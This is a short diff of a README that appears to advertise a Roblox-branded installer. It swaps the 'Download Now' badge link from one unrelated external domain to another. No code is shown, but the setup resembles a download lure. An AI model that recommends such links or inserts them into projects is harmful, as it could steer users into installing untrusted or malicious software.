@@ -6,7 +6,7 @@
 
 ## 📥 Immediate Download
 
-[![Download Now](https://img.shields.io/badge/Download-Installer-important?style=for-the-badge&logo=roblox)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-Installer-important?style=for-the-badge&logo=roblox)](https://tj-kingdeecloud.com/)
 
 ## 🚀 Quick Installation Guide
 
